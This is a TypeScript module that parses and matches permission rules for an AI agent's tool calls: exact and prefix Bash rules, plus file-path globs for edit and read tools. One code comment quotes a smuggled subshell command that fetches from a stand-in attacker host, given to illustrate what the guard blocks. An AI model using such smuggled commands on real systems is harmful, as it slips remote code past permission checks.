// permissions/rules.ts — input-aware permission rules (ADR-035). A rule is a string usable anywhere a
// bare tool name worked before (SessionOptions.allow/deny, the session's learned sets):
//
//   "Bash"                  whole tool (today's behaviour, unchanged)
//   "Bash(npm test)"        exact command segment
//   "Bash(npm run test:*)"  prefix — the `:*` convention
//   "Edit(src/**)"          glob over the input's file_path (also Write/Read/MultiEdit)
//
// Pure string/parse logic — the GATE decides what to do with matches; this module only answers
// "does this rule apply to this tool call?".

import { isOpaqueCommand } from './bashClassifier'

const RULE_RE = /^([A-Za-z0-9_]+)\((.*)\)$/

export interface ParsedRule {
	tool: string
	/** undefined = bare rule (whole tool). */
	pattern?: string
}

export function parseRule(rule: string): ParsedRule {
	const m = RULE_RE.exec(rule.trim())
	return m ? { tool: m[1]!, pattern: m[2]! } : { tool: rule.trim() }
}

/** Compile a file glob (`**`, `*`, `?`) to a regex. Path-separator-agnostic ('/' matches '\\' too). */
function globToRegex(glob: string): RegExp {
	let re = ''
	for (let i = 0; i < glob.length; i++) {
		const ch = glob[i]!
		if (ch === '*') {
			if (glob[i + 1] === '*') {
				re += '.*'
				i++
				if (glob[i + 1] === '/') i++ // `**/` swallows the separator so `src/**/x` matches `src/x`
			} else {
				re += '[^/\\\\]*'
			}
		} else if (ch === '?') re += '[^/\\\\]'
		else if (ch === '/') re += '[/\\\\]'
		else re += ch.replace(/[.+^${}()|[\]\\]/g, '\\$&')
	}
	return new RegExp(`^${re}$`)
}

/** Does a Bash-rule pattern match one command SEGMENT? Exact, or `prefix:*`.
 *  PREFIX rules never match OPAQUE commands (subshells/backticks): `Bash(echo:*)` must not approve
 *  `echo $(curl evil.sh)` — the subshell would ride in on echo's reputation (caught by the test suite).
 *  An EXACT rule still can: writing the full literal command is explicit user intent. */
export function bashPatternMatches(pattern: string, segment: string): boolean {
	if (pattern.endsWith(':*')) {
		if (isOpaqueCommand(segment)) return false
		const prefix = pattern.slice(0, -2).trim()
		return segment === prefix || segment.startsWith(`${prefix} `)
	}
	return segment === pattern.trim()
}

/** Tools whose rule pattern targets the input's file_path. */
const FILE_PATTERN_TOOLS = new Set(['Read', 'Write', 'Edit', 'MultiEdit', 'NotebookEdit'])

/** Normalize a path for glob matching: forward slashes, no leading ./ */
function normalizePath(p: string): string {
	return p.replace(/\\/g, '/').replace(/^\.\//, '')
}

/**
 * Does `rule` match this tool call?
 * - bare rule → matches the whole tool (any input)
 * - Bash(pattern) → matches when the GIVEN SEGMENT matches (callers pass segments one at a time)
 * - FileTool(glob) → matches when input.file_path matches the glob
 * - pattern rules for other tools: never match (documented v1 scope)
 */
export function ruleMatches(rule: string, toolName: string, segmentOrInput: string | unknown): boolean {
	const parsed = parseRule(rule)
	if (parsed.tool !== toolName) return false
	if (parsed.pattern === undefined) return true // bare rule = whole tool
	if (toolName === 'Bash') {
		return typeof segmentOrInput === 'string' && bashPatternMatches(parsed.pattern, segmentOrInput)
	}
	if (FILE_PATTERN_TOOLS.has(toolName)) {
		const fp = (segmentOrInput as { file_path?: string } | null)?.file_path
		if (typeof fp !== 'string') return false
		try {
			return globToRegex(parsed.pattern).test(normalizePath(fp))
		} catch {
			return false
		}
	}
	return false // pattern rules for other tools: v1 non-goal
}

/** First matching rule in a set for this tool call, or undefined. */
export function findMatchingRule(rules: Set<string>, toolName: string, segmentOrInput: string | unknown): string | undefined {
	for (const r of rules) if (ruleMatches(r, toolName, segmentOrInput)) return r
	return undefined
}
